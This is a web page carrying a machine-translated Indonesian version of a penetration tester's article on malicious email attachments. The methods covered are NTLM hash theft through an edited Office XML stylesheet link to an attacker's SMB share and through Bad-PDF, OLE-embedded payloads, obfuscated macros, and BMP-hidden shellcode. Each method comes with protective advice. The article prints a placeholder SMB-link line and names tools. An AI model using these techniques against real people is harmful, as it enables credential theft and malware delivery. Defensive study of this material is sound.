<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🏧 😚 😙 Terbuka tidak dapat diabaikan 🧔🏿 👩🏼‍🌾 📛</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Pekerjaan saya terkait dengan fakta bahwa saya berbohong kepada orang-orang dan mengeksploitasi sifat mudah tertipu, keingintahuan, keserakahan, dan s...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Terbuka tidak dapat diabaikan</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/jetinfosystems/blog/426463/"><img src="https://habrastorage.org/webt/j-/hv/q2/j-hvq2d89iomeavboeblim7pi9y.jpeg"><br><br>  Pekerjaan saya terkait dengan fakta bahwa saya berbohong kepada orang-orang dan mengeksploitasi sifat mudah tertipu, keingintahuan, keserakahan, dan sebagainya.  Saya menyukai pekerjaan saya dan mencoba mendekatinya secara kreatif.  Kekhasan aktivitas saya terkait dengan melakukan serangan dengan metode rekayasa sosial.  Dan dalam posting ini saya ingin berbicara tentang lampiran jahat. <br><a name="habracut"></a><br>  Jika PDF masuk ke email Anda, apakah Anda akan membukanya?  Dan file Word?  Apakah Anda akan membuka gambar dari sumber yang tidak dikenal?  Apakah mungkin mengalami masalah jika Anda mengunduh arsip?  Seberapa baik Anda tahu investasi mana yang berbahaya dan mana yang tidak?  Bagaimana dengan kolega Anda? <br><br>  Untuk beberapa lusin proyek, saya telah mencoba cara yang sangat berbeda untuk mengirimkan muatan kepada pengguna.  Beberapa sangat efektif, beberapa mudah dideteksi - masing-masing memiliki kekurangan dan kelebihan masing-masing.  Saya tidak akan mulai memberi tahu cara mengemas file yang dapat dieksekusi dengan ekstensi .exe di arsip.  Dengan pendekatan kuno seperti itu, menerobos sistem keamanan, dan kemudian juga membuat pengguna memulai lampiran, lebih mahal.  Saya akan memberi tahu Anda file apa yang berpotensi berbahaya yang sebenarnya dapat diterima melalui pos (atau dikirim) hari ini. <br><br>  Penafian: Semua hal berikut ini hanya untuk tujuan informasi.  Penulis menggambarkan pengalaman yang diperoleh selama pentest, tidak bertanggung jawab atas pengulangan serangan-serangan ini dan mendorong untuk tidak menggunakan materi untuk tujuan ilegal. <br><br><h2>  XML </h2><br>  <b>Esensi dari metode ini</b> <br><br>  Sebagian besar file Office didasarkan pada Microsoft Office Open XML (OOXML), yang pada dasarnya adalah format XML terkompresi yang dikembangkan oleh Microsoft untuk menyajikan tabel, grafik, presentasi, dan sebagainya.  Keterlibatan XML ditampilkan dalam ekstensi dokumen (docx, xlsx, pptx).  Sangat aneh bahwa dokumen Office semacam itu dapat dibuka sebagai file teks biasa dengan semua tag dan atribut.  File Office Open XML apa pun dapat disimpan sebagai XML dan membuat perubahan pada tag.  Misalnya, tambahkan tautan ke folder publik yang dikendalikan oleh penyerang.  Ketika Anda menjalankan file XML, itu mencoba untuk terhubung ke folder publik yang terbuka.  Ketika mencoba terhubung melalui protokol smb, Windows dengan ramah menyediakan hash NTLM (NTLMv2) dan login pengguna ke penyerang. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/08c/d1a/28f/08cd1a28f9c6ee5699c995d8cf3377e2.png"><br><br>  <b>Singkatnya implementasi</b> <br><br>  Untuk mengimplementasikan vektor, Anda perlu membuat dokumen Office Open XML (docx, pptx, xlsx, dll.), Simpan sebagai XML.  Buka XML dan buat perubahan berikut: <br><br> <code>&lt;?xml-stylesheet type="text/xsl" href="\\xxx.xxx.xxx.xxx <u>\test\swordfish.xsl</u> "&gt;</code> <br> <br>  Dalam tag yang ditentukan, Anda harus menentukan alamat folder jaringan publik tempat korban akan terhubung. <br><br>  <b>Catatan</b> : alih-alih <code>="\\xxx.xxx.xxx.xxx\test\swordfish.xsl</code> Anda dapat menulis <code>file:/// xxx.xxx.xxx.xxx/test/swordfish.xsl</code> . Selanjutnya, file tersebut harus disimpan dan dikirim ke korban. <br><br>  Informasi tentang serangan itu dapat ditemukan di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini</a> . <br><br>  <b>Catatan</b> : tergantung pada sistem operasi dan pengaturan, pengguna mungkin harus menyetujui persyaratan atau komentar tambahan, misalnya: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/0e3/175/b41/0e3175b41c0ef9cb1e79c19295710e94.png"><br><br>  Artikel tidak akan lengkap tanpa saran perlindungan: <br><br><ul><li>  Gunakan kebijakan kata sandi yang kompleks. </li><li>  Gunakan NTLMv2. </li><li>  Tolak lalu lintas eksternal melalui seseorang (tcp 139/445). </li></ul><br><h2>  Bad-pdf </h2><br>  <b>Esensi dari metode ini</b> <br><br>  Tag ditambahkan ke file PDF dengan tautan ke server seseorang yang dikendalikan oleh penyerang.  Seperti pada contoh di atas, ketika membuka file, sistem operasi mentransmisikan hash NTLM (NTLMv2) untuk terhubung ke folder publik. <br><br>  <b>Singkatnya implementasi</b> <br><br>  Menerapkan serangan ini jauh lebih mudah daripada yang sebelumnya.  Untuk berhasil mencuri hash, cukup unduh utilitasnya (git clone di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini</a> atau di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini</a> ) dan berikan hak untuk mengeksekusi (chmod + x) file python.  Selanjutnya, jalankan skrip python dan masukkan alamat IP, nama file, dan antarmuka, seperti pada gambar di bawah ini. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/318/d7c/e30/318d7ce30c76b661055d975b8875b597.png"><br>  <i>Menghasilkan file payload.</i> <br><br>  File yang diterima dapat dikirim ke surat dengan kedok ucapan selamat, dokumen untuk tanda tangan, pemindaian aplikasi dan sebagainya.  Ketika file dimulai, semua hash akan dikirim ke penyerang. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/198/0d6/dd2/1980d6dd2efd24b39c393c31f4b36611.png"><br><br>  <b>Perlindungan</b> <br><br><ul><li>  Gunakan kebijakan kata sandi yang kompleks. </li><li>  Gunakan NTLMv2. </li><li>  Tolak lalu lintas eksternal melalui seseorang (tcp 139/445). </li></ul><br><h2>  Objek OLE </h2><br>  <b>Esensi dari metode ini</b> <br><br>  Dalam dokumen Office yang sah, skrip yang diluncurkan dengan mengklik tertanam.  Script dapat berupa apa saja, biasanya hanya muatan.  Ini memiliki ikon sendiri, yang dapat diubah, tergantung pada keinginan penyerang, hingga salinan lengkap dari gaya dokumen Office yang mensimulasikan pesan kesalahan.  Tidak seperti makro, file dengan lampiran OLE tidak mencurigakan bagi pengguna biasa. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/b16/113/233/b161132334ba58421370c143a9942677.png" width="400"></div><br>  <b>Singkatnya implementasi</b> <br><br>  Untuk mempersiapkan serangan ini harus menghabiskan sedikit lebih banyak usaha (dibandingkan dengan yang di atas).  Langkah pertama adalah menghasilkan payload.  Selanjutnya, Anda perlu memulai server, yang akan menerima koneksi dari payload, kemudian membuat dokumen-Word, mengubahnya menjadi RTF dan menambahkan tautan ke payload.  Jika singkat. <br>  Informasi tentang serangan itu dapat ditemukan di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini</a> . <br><br>  <b>Perlindungan</b> <br><br>  Untuk melindungi dari serangan tersebut, kami <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">menyarankan Anda</a> membuat perubahan registri berikut: <br><br> <code>HKCUSoftwareMicrosoftOffice -&gt; Office Version -&gt; Office application -&gt; SecurityPackagerPrompt</code> <br> <br>  Nilai <code>Office Version</code> mungkin 16.0 (Office 2016);  15.0 (Office 2013);  14.0 (Office 2010);  atau 12.0 (Office 2007).  Nilai <code>Office application</code> adalah nama aplikasi Office tertentu, yaitu, Word, Excel, dan sebagainya. <br><br>  Nilai kunci registri ini harus "2", yang berarti "Tidak meminta, Objek tidak mengeksekusi" atau larangan aktual pada eksekusi objek.  Nilai "1" memungkinkan pengguna untuk "Meminta dari Office saat pengguna mengklik, objek mengeksekusi", yaitu, objek diklik klik, dan Office menampilkan pesan yang sesuai.  Nilai "0", pada gilirannya, berarti "Tidak ada konfirmasi dari Office saat pengguna mengklik, objek dieksekusi", dengan kata lain, objek dieksekusi, tetapi pengguna tidak menerima pesan apa pun dari Office. <br><br>  Perubahan dapat dilakukan jika fungsi-fungsi ini tidak digunakan dalam proses bisnis perusahaan Anda. <br><br><h2>  Makro </h2><br>  Karena OLE disebutkan, bagaimana saya tidak bisa menyebutkan makro? <br><br><img src="https://habrastorage.org/getpro/habr/post_images/ae7/b0b/9f7/ae7b0b9f78363bd943682230cc391fb8.png"><br><br>  <b>Esensi dari metode ini</b> <br><br>  Makro - seperangkat perintah yang dirancang untuk menyederhanakan pekerjaan pengguna.  Secara potensial, Anda dapat menulis set perintah apa pun secara makro dan karenanya mendapatkan payload.  Untuk membuat dokumen dengan makro, penyerang hanya perlu mengaburkan kode payload dan menambahkan kode ke makro dokumen. <br><br>  <b>Singkatnya implementasi</b> <br><br>  Ada banyak cara hebat untuk menghasilkan makro saat ini.  Anda dapat menggunakan alat <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Luckystrike</a> atau berhenti di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Metasploit yang</a> lebih akrab.  Anda dapat menggunakan msfvenom dan mengaburkan makro setelah generasi.  Saat makro dibuat, yang perlu Anda lakukan adalah menambahkannya ke dokumen Office.  Tetapi tidak seperti lampiran OLE, Anda benar-benar membutuhkan banyak upaya untuk menjalankan makro.  Saat ini, sangat sedikit pengguna yang menjalankan makro.  Windows telah belajar memperingatkan tentang makro yang mencurigakan, dan ada banyak pembicaraan tentang bahaya mereka. <br><br>  <b>Perlindungan</b> <br><br>  Untuk keandalan, saya sarankan menonaktifkan eksekusi makro tanpa pemberitahuan. <br><br><h2>  BMP </h2><br>  Sangat tidak mungkin Anda akan menemukan lampiran BMP dengan shellcode, jadi berhati-hatilah: ada yang seperti itu. <br><br>  <b>Esensi dari metode ini</b> <br><br>  Kode shell tertanam dalam gambar dalam format BMP.  Gambar itu sendiri tidak berbahaya pada saat ditemukan.  Ini bukan tentang membiarkan penyerang mengambil sesi.  Gambar diperlukan untuk berbaring dan menunggu saat penyerang mengaktifkannya menggunakan perintah Powershell.  Metode ini tidak begitu banyak serangan sebagai bypass antivirus dan alat deteksi intrusi. <br><br>  <b>Singkatnya implementasi</b> <br><br>  Untuk membuat gambar, cukup gunakan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">repositori</a> ini.  DKMC menyediakan segalanya, mulai dari pembuatan gambar hingga kebingungan kode.  Saya juga ingin mencatat bahwa gambar "terinfeksi" akan berisi piksel multi-warna yang aneh.  Ini dapat dengan mudah diperbaiki jika Anda memotong area gambar yang terlihat sebesar 5-10 piksel. <br><br>  Setelah membuat gambar, file harus dikirim ke korban dan menunggu saat yang tepat atau mencari kesempatan untuk menjalankan skrip PowerShell. <br><br>  <b>Perlindungan</b> <br><br>  Memfilter setiap file bmp karena berpotensi berbahaya tidak efisien.  Anda dapat menggunakan konverter dan menyimpan gambar dalam format lain, memeriksa file di komputer, atau menerima kenyataan bahwa jika penyerang berhasil menggunakan skrip PowerShell di komputer karyawan, maka keberadaan gambar dengan kode shell bukanlah masalah keamanan utama. <br><br>  Faktanya, itu saja.  Saya harap artikel ini telah memperluas pemahaman Anda tentang investasi dan bahaya yang mungkin mereka hadapi.  Kami akan berbicara tentang tautan yang mencurigakan nanti. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/95a/62c/c68/95a62cc68d2af00c3b53b649faf4638b.png"><br><br>  <i>Ekaterina Rudaya ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" class="user_link">Caterin</a> ), pakar di Laboratorium untuk Analisis Keamanan Praktis, Jet Infosystems</i> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id426463/">https://habr.com/ru/post/id426463/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id426449/index.html">iPhone XS: mengapa ini kamera baru</a></li>
<li><a href="../id426451/index.html">Perpisahan yang panjang dengan Baxter, raksasa terlemah di antara robot</a></li>
<li><a href="../id426457/index.html">Pengguna Google telah melewati tonggak 25% dalam jumlah koneksi IPv6</a></li>
<li><a href="../id426459/index.html">Habrokvest untuk menghormati peringatan 20 tahun Grup Mail.Ru - 20 tugas</a></li>
<li><a href="../id426461/index.html">Garage find: TESLA tanpa lari</a></li>
<li><a href="../id426465/index.html">“Kami mengubah medan” - IT menuju ke lokasi konstruksi yang besar</a></li>
<li><a href="../id426469/index.html">Telegram sebagai standar perusahaan</a></li>
<li><a href="../id426471/index.html">Bagaimana data spyware bocor</a></li>
<li><a href="../id426473/index.html">Arsitektur redux. Ya atau tidak</a></li>
<li><a href="../id426475/index.html">Miya - asisten dari smartphone</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>